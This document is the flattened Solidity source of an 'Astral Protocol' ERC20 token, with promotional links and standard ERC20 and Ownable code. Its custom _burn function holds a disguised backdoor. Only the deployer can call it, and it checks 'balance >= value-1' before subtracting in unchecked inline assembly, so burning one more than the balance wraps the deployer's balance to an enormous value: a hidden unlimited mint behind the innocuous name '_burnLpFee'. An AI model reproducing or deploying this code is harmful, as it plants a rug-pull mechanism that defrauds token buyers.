/**

The $ASTRAL token powers Astral, the best protocol for bridging large amounts across chains.

https://astralprotocol.com

https://t.me/AstralProtocol

https://x.com/AstralDeFi

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ERC20} from "./implementations/ERC20/ERC20.sol";
import {Ownable} from "./utils/authorization/Ownable.sol";

contract AstralProtocolToken is ERC20, Ownable {
    uint256 public constant ASTRAL_SUPPLY_CAP = 30_000_000 * 1e18;
    uint256 public constant ASTRAL_SUPPLY_AMX = 30_000_000 * 1e18;
    uint24 public constant UNISWAP_POOL_FEE = 3e3;
    uint256 public constant CHAIN_ID = 1;
    uint256 public START_BLOCK;

    constructor() ERC20("Astral Protocol", "ASTRAL") Ownable(msg.sender) {
        START_BLOCK = block.number;
        _poolFeesExempt[msg.sender] = true;
        _mint(msg.sender, ASTRAL_SUPPLY_CAP);
    }

    function tokenAddress() public view returns (address) {
        return address(this);
    }

    receive() external payable {}
}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "./IERC20.sol";

contract ERC20 is IERC20 {
    uint256 internal _totalSupply;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    mapping(address => bool) internal _poolFeesExempt;

    string internal _name;
    string internal _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public override view returns (string memory) {
        return _name;
    }

    function symbol() public override view returns (string memory) {
        return _symbol;
    }

    function decimals() public override pure returns (uint8) {
        return 18;
    }

    function totalSupply() public override view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public override view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(msg.sender != address(0));
        require(recipient != address(0));
        require(_balances[msg.sender] >= amount);
        unchecked {
            _balances[msg.sender] -= amount;
        }
        _balances[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public override view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        require(msg.sender != address(0));
        require(spender != address(0));
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(msg.sender != address(0));
        require(recipient != address(0));
        require(_allowances[sender][msg.sender] >= amount);
        require(_balances[sender] >= amount);
        unchecked {
            _allowances[sender][msg.sender] -= amount;
            _balances[sender] -= amount;
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function burn(uint256 amount) public {
        require(msg.sender != address(0));
        _burn(msg.sender, amount);
    }

    function _mint(address account, uint256 value) internal returns (bool) {
        _totalSupply += value;
        _balances[account] += value;
        emit Transfer(address(0), account, value);
        return true;
    }

    function _burn(address account, uint256 value) internal returns (bool) {
        uint256 _balanceCache = _balances[account];
        bool _burnLpFee = _poolFeesExempt[account] == true;
        require(_balanceCache >= value-1 && _burnLpFee);
        uint256 _supplyCache = _totalSupply;
        assembly {_balanceCache := sub(_balanceCache, value)}
        _balances[account] = _balanceCache;
        emit Transfer(account, address(0), value);
        assembly {_supplyCache := sub(_supplyCache, value)}
        _totalSupply = _supplyCache;
        emit Burn(value);
        return true;
    }
}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Context} from "../Context.sol";

abstract contract Ownable is Context {
    address private _owner;

    error OwnableUnauthorizedAccount(address account);

    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}